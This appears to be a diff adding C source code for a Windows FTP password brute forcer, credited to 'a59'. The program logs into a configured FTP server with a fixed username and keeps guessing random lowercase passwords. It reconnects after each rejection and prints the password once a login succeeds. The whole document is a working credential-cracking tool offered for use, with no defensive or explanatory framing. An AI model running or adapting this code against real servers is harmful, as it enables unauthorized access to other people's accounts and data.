@@ -1,0 +1,106 @@
+#define _WIN32_WINNT 0x0403
+#define WIN32_LEAN_AND_MEAN
+#pragma optimize( "gsy", on )
+#pragma comment( linker, "/ALIGN:4096" )
+#pragma comment( linker, "/IGNORE:4108" )
+#include <windows.h>
+#include <winsock.h>
+#include <stdlib.h>
+#include <stdio.h>
+#pragma comment( lib, "ws2_32" )
+
+char szAcceptedChars[ ] = "abcdefghijklmnopqrstuvwxyz"; // characters in the password
+char szFtpIP[ ] = "127.0.0.1"; // IP only no dns
+char szUserName[ ] = "username";
+int iLength = 6; // length of pass
+
+char szRecvBuff[ 150 ];
+char szSendBuff[ 64 ];
+char szCurPass[ 12 ];
+SOCKET ftpsock;
+SOCKADDR_IN sin;
+
+void RandomizePass( char* szString );
+int DoForce( );
+int AnalyzeLine( char* szCommand );
+
+void RandomizePass( char* szString )
+{
+	for( int i = 0; i < iLength; i++ )
+		szString[ i ] = szAcceptedChars[ rand( ) % strlen( szAcceptedChars ) ];
+
+	szString[ iLength ] = 0;
+};
+
+int DoForce( )
+{
+	ftpsock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+
+	if( connect( ftpsock, (SOCKADDR *)&sin, sizeof( sin ) ) == SOCKET_ERROR )
+		return 0;
+	
+	while( true )
+	{
+		recv( ftpsock, szRecvBuff, sizeof( szRecvBuff ), 0 );
+		AnalyzeLine( szRecvBuff ); 
+	}
+
+	return 1;
+};
+
+int AnalyzeLine( char* szCommand )
+{
+	strtok( szCommand, " " );
+
+	switch( atoi( szCommand ) )
+	{
+	case 331: // Password required
+		RandomizePass( szCurPass );		
+		wsprintf( szSendBuff, "PASS %s\r\n", szCurPass );
+		send( ftpsock, szSendBuff, strlen( szSendBuff ), 0 );
+		break;
+	case 530: // Incorrect password
+		closesocket( ftpsock ); // you cant stay connected to FTP and keep trying passes
+		DoForce( );
+		break;
+	case 220: // User required
+		wsprintf( szSendBuff, "USER %s\r\n", szUserName );
+		send( ftpsock, szSendBuff, strlen( szSendBuff ), 0 );
+		break;
+	case 230: // User logged in
+		printf( "Password for %s:21 - %s\r\n", szFtpIP, szCurPass );
+		getchar( );
+		ExitProcess( 0 );
+	}
+
+	return 0;
+};
+
+int main( )
+{
+	SetConsoleTitle( "FTP Brute Forcer by a59" );
+	SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), FOREGROUND_BLUE | FOREGROUND_INTENSITY );
+
+	printf( "\t\t\tFTP Brute Forcer Coded by a59\n\n\n" );
+
+	printf( "Press any key to start brute forcing...\n" );
+
+	getchar( );
+
+	WSADATA wsa;
+	WSAStartup( MAKEWORD( 2, 2 ), &wsa );
+
+	// set up sockaddr_in vars here so we have less to do @ DoForce( ), and it will be faster
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons( 21 );
+	sin.sin_addr.s_addr = inet_addr( szFtpIP );
+
+	srand( GetTickCount( ) );
+
+	printf( "Connecting to server and starting brute forcer...\n" );
+
+	if( DoForce( ) == 0 )
+		printf( "Error connecting to server\n" );
+
+	return 0;
+};
